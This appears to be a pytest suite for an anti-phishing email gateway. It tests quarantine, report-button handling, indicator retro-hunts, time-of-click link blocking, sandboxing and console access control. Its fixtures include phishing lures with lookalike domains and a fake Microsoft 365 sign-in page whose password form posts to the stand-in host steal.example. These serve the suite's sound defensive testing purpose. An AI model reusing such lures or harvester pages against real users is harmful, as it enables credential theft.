import json

from fastapi.testclient import TestClient

from phishguard.app import create_app
from phishguard.gateway import GatewayHandler
from tests import samples
from tests.conftest import MAILBOXES, make_settings
from tests.fakes import FakeCape

AMA, KOFI, FIN = MAILBOXES


def test_m365_quarantine_warn_and_clean(m365):
    app, graph, console = m365
    graph.deliver(AMA, samples.CREDENTIAL_PHISH)
    graph.deliver(AMA, samples.NEWSLETTER)
    weak = samples.build("promo@deals.example", "Final reminder", text="Final reminder: offer expires today. "
                         "Verify your account at http://deals-login.xyz/account", msgid="<weak@deals.example>")
    graph.deliver(KOFI, weak)
    assert app.state.guard.poll_m365() == 3
    assert graph.folder_of(AMA, "<phish-1@rnicrosoft.com>") == [f"quarantine-{AMA}"]
    assert graph.folder_of(AMA, "<news-1@microsoft.com>") == ["inbox"]
    msgs = {m["subject"]: m for m in console.get("/api/messages")}
    assert msgs["Action required: your mailbox will be suspended"]["status"] == "quarantined"
    assert msgs["Your November product update"]["status"] == "delivered"
    warned = msgs["Final reminder"]
    assert warned["status"] == "warned"
    assert [m["categories"] for m in graph.boxes[KOFI].values()] == [["PhishGuard: Suspicious"]]
    alert = next(m for m in graph.sent if m["to"] == [KOFI])
    assert "Report it to IT Security" in alert["html"]
    assert any(m["to"] == ["soc@abelzeta.com"] for m in graph.sent)      # SOC told about the quarantine
    # analyst releases the quarantined message back to the inbox
    pid = msgs["Action required: your mailbox will be suspended"]["id"]
    console.post(f"/api/messages/{pid}/release", json={"reason": "test"})
    assert graph.folder_of(AMA, "<phish-1@rnicrosoft.com>") == ["inbox"]


def test_report_button_review_purges_every_mailbox_and_blocks(m365):
    app, graph, console = m365
    # a well-crafted lure that scored clean, delivered to three people
    lure = samples.build("hr-benefits@benefits-portal.example", "2027 benefits enrolment",
                         text="Please review your 2027 benefits selection at https://benefits-portal.example/enrol",
                         msgid="<lure-1@benefits-portal.example>")
    for mb in MAILBOXES:
        graph.deliver(mb, lure)
    app.state.guard.poll_m365()
    assert all(graph.folder_of(mb, "<lure-1@benefits-portal.example>") == ["inbox"] for mb in MAILBOXES)

    # Ama clicks "Report Phishing" in Outlook (add-in)
    r = console.client.post("/api/addin/report", json={"internet_message_id": "<lure-1@benefits-portal.example>",
                                                       "reporter": AMA})
    assert r.status_code == 200 and r.json()["duplicate"] is False
    # someone who never received it cannot report it into the queue
    assert console.client.post("/api/addin/report", json={"internet_message_id": "<nope@x>", "reporter": AMA}).status_code == 404
    reports = console.get("/api/reports")
    assert len(reports) == 1 and reports[0]["reporter"] == AMA

    result = console.post(f"/api/reports/{reports[0]['id']}/review",
                          json={"decision": "confirmed", "note": "credential harvesting"})
    assert "sender:hr-benefits@benefits-portal.example" in result["indicators_added"]
    assert "domain:benefits-portal.example" in result["indicators_added"]
    assert sorted(result["purge"]["mailboxes"]) == sorted(MAILBOXES)
    assert all(graph.folder_of(mb, "<lure-1@benefits-portal.example>") == [f"quarantine-{mb}"] for mb in MAILBOXES)
    assert any(m["to"] == [AMA] and "confirmed as malicious" in m["html"] for m in graph.sent)

    # the next mail from that sender is blocked on arrival by the new indicator
    graph.deliver(FIN, samples.build("hr-benefits@benefits-portal.example", "Reminder", text="Hi",
                                     msgid="<lure-2@benefits-portal.example>"))
    app.state.guard.poll_m365()
    assert graph.folder_of(FIN, "<lure-2@benefits-portal.example>") == [f"quarantine-{FIN}"]


def test_new_indicator_retro_hunts_delivered_mail(m365):
    app, graph, console = m365
    msg = samples.build("billing@vendor-x.example", "Statement", text="View at https://files.vendor-x.example/s/123",
                        msgid="<stmt@vendor-x.example>")
    graph.deliver(KOFI, msg)
    app.state.guard.poll_m365()
    res = console.post("/api/indicators", status=201, json={"kind": "url", "value": "https://files.vendor-x.example/s/123"})
    assert len(res["remediated"]) == 1
    assert graph.folder_of(KOFI, "<stmt@vendor-x.example>") == [f"quarantine-{KOFI}"]
    # shared domains are refused as block indicators
    r = console.client.post("/api/indicators", headers=console.h, json={"kind": "domain", "value": "gmail.com"})
    assert r.status_code == 422


def test_time_of_click_detects_page_weaponised_after_delivery(tmp_path):
    pages = {"https://docs.partner.example/q4": (200, {"Content-Type": "text/html"}, b"<html><p>Q4 report</p></html>")}
    app = create_app(make_settings(tmp_path, click_fetch=True), page_get=lambda u: pages[u],
                     resolver=lambda h: ["93.184.216.34"], background=False)
    guard, client = app.state.guard, TestClient(app)
    mid, _ = guard.process(samples.build("pm@partner.example", "Q4", text="Report: https://docs.partner.example/q4",
                                         msgid="<q4@partner.example>"), "gateway", mailbox=AMA)
    link = guard.make_link("https://docs.partner.example/q4", mid, AMA)
    token = link.rsplit("/", 1)[-1]
    r = client.get(f"/c/{token}", follow_redirects=False)
    assert r.status_code == 302 and r.headers["location"] == "https://docs.partner.example/q4"
    # the attacker swaps the page for a credential harvester after delivery
    pages["https://docs.partner.example/q4"] = (200, {"Content-Type": "text/html"},
        b"<html><title>Microsoft 365 sign in</title><form action='https://steal.example/x'><input type=password></form></html>")
    with guard.db.tx() as conn:
        conn.execute("DELETE FROM url_cache")
    r = client.get(f"/c/{token}", follow_redirects=False)
    assert r.status_code == 403 and "Dangerous link blocked" in r.text and "Report this e-mail" in r.text
    # post-delivery remediation: the URL is now blocked and the message pulled
    assert guard.message_row(mid)["status"] == "quarantined"
    with guard.db.read() as conn:
        assert conn.execute("SELECT source FROM indicators WHERE kind = 'url'").fetchone()["source"] == "time-of-click"
    # links that resolve into the internal network are refused
    internal = guard.make_link("http://admin.intranet/", mid, AMA).rsplit("/", 1)[-1]
    app.state.guard.resolver = lambda h: ["10.0.0.4"]
    assert client.get(f"/c/{internal}", follow_redirects=False).status_code == 403


def test_banner_report_link_requires_valid_signature_and_post(tmp_path):
    app = create_app(make_settings(tmp_path), background=False)
    guard, client = app.state.guard, TestClient(app)
    mid, _ = guard.process(samples.VENDOR_BANK_CHANGE, "gateway", mailbox=FIN)
    url = guard.report_link(mid, FIN).replace("https://pg.abelzeta.com", "")
    assert "Report phishing" in client.get(url).text
    with guard.db.read() as conn:
        assert conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0] == 0   # GET alone files nothing
    assert "Thank you" in client.post(url, data={"comment": "odd"}).text
    assert client.get(url[:-3] + "abc").status_code == 404


def test_sandbox_conviction_remediates_delivered_attachment(m365):
    app, graph, console = m365
    guard = app.state.guard
    guard.sandbox = FakeCape(malscore=9.1)
    # a document that looks only mildly suspicious statically (macro format) but detonates as malware
    weird = samples.build("ops@logistics.example", "Shipping schedule", text="Schedule attached.",
                          attachments=[("schedule.xlsm", "application/vnd.ms-excel.sheet.macroEnabled.12", b"PK\x03\x04junk")],
                          msgid="<xlsm@logistics.example>")
    graph.deliver(AMA, weird)
    guard.poll_m365()
    assert graph.folder_of(AMA, "<xlsm@logistics.example>") == ["inbox"]
    guard.sandbox_cycle()          # submit
    convicted = guard.sandbox_cycle()   # result
    assert len(convicted) == 1
    assert graph.folder_of(AMA, "<xlsm@logistics.example>") == [f"quarantine-{AMA}"]
    detail = console.get(f"/api/messages/{console.get('/api/messages')[0]['id']}")
    assert detail["sandbox"][0]["malscore"] == 9.1


def test_gateway_rewrites_links_adds_banner_and_holds_malicious(tmp_path):
    app = create_app(make_settings(tmp_path), background=False)
    guard = app.state.guard
    delivered = []
    handler = GatewayHandler(guard, lambda raw, rcpts, mail_from="": delivered.append((raw, rcpts)))
    weak = samples.build("promo@deals.example", "Final reminder",
                         text="Final reminder: offer expires today. Verify your account to keep your points.",
                         html='<p>Offer expires today</p><a href="http://deals-login.xyz/account">Verify your account</a>',
                         msgid="<weak@deals.example>")
    assert handler.process(weak, "promo@deals.example", [AMA], "203.0.113.5").startswith("250")
    from phishguard.emailparse import parse_email
    out = parse_email(delivered[0][0])
    assert out.subject == "[SUSPICIOUS] Final reminder" and out.header("X-PhishGuard-Verdict").startswith("suspicious")
    assert "PhishGuard flagged this e-mail" in out.html and "PhishGuard flagged this e-mail" in out.text
    web_links = [l.url for l in out.links if l.url.startswith("http") and "/r/" not in l.url]  # /r/ = report link
    assert web_links and all(u.startswith("https://pg.abelzeta.com/c/") for u in web_links)
    assert "deals-login.xyz" not in out.html.split("</table>", 1)[1]
    # malicious mail is accepted but not delivered (quarantined)
    handler.process(samples.MACRO_MALWARE, "billing@freight-partners.example", [FIN], "203.0.113.5")
    assert len(delivered) == 1
    qid = max(m["id"] for m in [dict(r) for r in guard.db.connect().execute("SELECT id FROM messages")])
    assert guard.message_row(qid)["status"] == "quarantined"
    guard.deliver = lambda raw, rcpts: delivered.append((raw, rcpts))
    guard.release(qid, "analyst", "false positive")
    assert delivered[-1][1] == [FIN]


def test_forwarded_reports_from_any_mail_client(m365):
    app, graph, console = m365
    app.state.settings.report_mailbox = FIN
    from email.message import EmailMessage
    fwd = EmailMessage()
    fwd["From"], fwd["To"], fwd["Subject"] = KOFI, FIN, "FW: weird invoice"
    fwd["Message-ID"] = "<fwd-1@abelzeta.com>"
    fwd.set_content("Looks fake")
    fwd.add_attachment(samples.VENDOR_BANK_CHANGE, maintype="message", subtype="rfc822", filename="original.eml")
    graph.deliver(FIN, fwd.as_bytes())
    app.state.guard.poll_m365()
    rep = console.get("/api/reports")[0]
    assert rep["reporter"] == KOFI and rep["channel"] == "forward" and rep["subject"] == "Updated remittance details"


def test_console_requires_login_and_roles(tmp_path):
    app = create_app(make_settings(tmp_path), background=False)
    client = TestClient(app)
    assert client.get("/api/messages").status_code == 401
    from tests.conftest import Console
    console = Console(app)
    console.post("/api/users", status=201, json={"username": "viewer1", "full_name": "View Only", "role": "viewer",
                                                 "temporary_password": "Viewer-Temp-123"})
    tok = client.post("/api/auth/login", json={"username": "viewer1", "password": "Viewer-Temp-123"}).json()["token"]
    h = {"Authorization": f"Bearer {tok}"}
    assert client.get("/api/messages", headers=h).status_code == 401      # must change password first
    client.post("/api/auth/change-password", headers=h, json={"old_password": "Viewer-Temp-123",
                                                               "new_password": "Viewer-Strong-2026"})
    assert client.get("/api/messages", headers=h).status_code == 200
    assert client.post("/api/indicators", headers=h, json={"kind": "sender", "value": "a@b.example"}).status_code == 403
    assert client.get("/addin/manifest.xml").text.count("https://pg.abelzeta.com/addin/commands.html") == 2
